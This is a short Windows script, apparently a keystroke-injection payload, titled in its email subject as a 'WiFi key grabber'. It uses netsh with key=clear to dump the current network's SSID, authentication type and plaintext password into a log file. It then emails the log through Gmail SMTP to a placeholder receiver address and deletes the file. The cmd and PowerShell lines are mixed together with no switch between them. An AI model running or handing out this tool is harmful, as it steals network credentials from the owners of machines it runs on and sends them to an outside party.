cmd
cd "%USERPROFILE%\Desktop" & for /f "tokens=2 delims=:" %A in ('netsh wlan show interface ^| findstr "SSID" ^| findstr /v "BSSID"') do set A=%A
set A="%A:~1%"
netsh wlan show profiles %A% key=clear | findstr /c:"Network type" /c:"Authentication" /c:"Key Content" | findstr /v "broadcast" | findstr /v "Radio">>A.txt
for /f "tokens=3 delims=: " %A in ('findstr "Network type" A.txt') do set B=%A
for /f "tokens=2 delims=: " %A in ('findstr "Authentication" A.txt') do set C=%A
for /f "tokens=3 delims=: " %A in ('findstr "Key Content" A.txt') do set D=%A
del A.txt
echo SSID: %A%>>Log.txt & echo Network type: %B%>>Log.txt & echo Authentication: %C%>>Log.txt & echo Password: %D%>>Log.txt
$SMTPServer = 'smtp.gmail.com'
$SMTPInfo = New-Object Net.Mail.SmtpClient($SmtpServer, 587)
$SMTPInfo.EnableSsl = $true
$SMTPInfo.Credentials = New-Object System.Net.NetworkCredential('ACCOUNT@gmail.com', 'PASSWORD')
$ReportEmail = New-Object System.Net.Mail.MailMessage
$ReportEmail.From = 'ACCOUNT@gmail.com'
$ReportEmail.To.Add('RECEIVER@gmail.com')
$ReportEmail.Subject = 'WiFi key grabber'
$ReportEmail.Body = (Get-Content Log.txt | out-string)
$SMTPInfo.Send($ReportEmail)
exit
del Log.txt & exit
exit